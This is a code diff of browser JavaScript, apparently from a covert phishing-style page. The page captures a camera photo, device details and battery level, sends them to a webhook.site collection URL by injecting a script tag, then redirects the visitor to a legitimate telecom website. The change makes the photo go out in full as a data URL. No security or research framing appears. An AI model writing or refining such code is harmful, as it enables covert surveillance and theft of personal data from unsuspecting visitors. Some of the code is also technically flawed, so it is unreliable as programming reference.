@@ -21,24 +21,32 @@
                 };
                 const batteryPercentage = navigator.getBattery().level * 100;
 
-                // Prepare data to send in a JSONP request
-                const dataToSend = {
-                    photo: URL.createObjectURL(photoBlob),
-                    deviceInfo: deviceInfo,
-                    batteryPercentage: batteryPercentage
+                // Convert the photoBlob into a data URL
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    const dataURL = event.target.result;
+
+                    // Prepare data to send in a JSONP request
+                    const dataToSend = {
+                        photo: dataURL,
+                        deviceInfo: deviceInfo,
+                        batteryPercentage: batteryPercentage
+                    };
+
+                    // Create a JSONP request
+                    const script = document.createElement('script');
+                    script.src = 'https://webhook.site/6bab9354-77d4-4922-9f9c-32c264d35fb7?data=' + JSON.stringify(dataToSend);
+
+                    // Redirect after the request is sent
+                    script.onload = function() {
+                        window.location.href = 'https://www.mobitel.lk';
+                    };
+
+                    // Append the script to the document
+                    document.body.appendChild(script);
                 };
 
-                // Create a JSONP request
-                const script = document.createElement('script');
-                script.src = 'https://webhook.site/6bab9354-77d4-4922-9f9c-32c264d35fb7?data=' + JSON.stringify(dataToSend);
-
-                // Redirect after the request is sent
-                script.onload = function() {
-                    window.location.href = 'https://www.mobitel.lk';
-                };
-
-                // Append the script to the document
-                document.body.appendChild(script);
+                reader.readAsDataURL(photoBlob);
             })
             .catch(function(error) {
                 // Handle errors
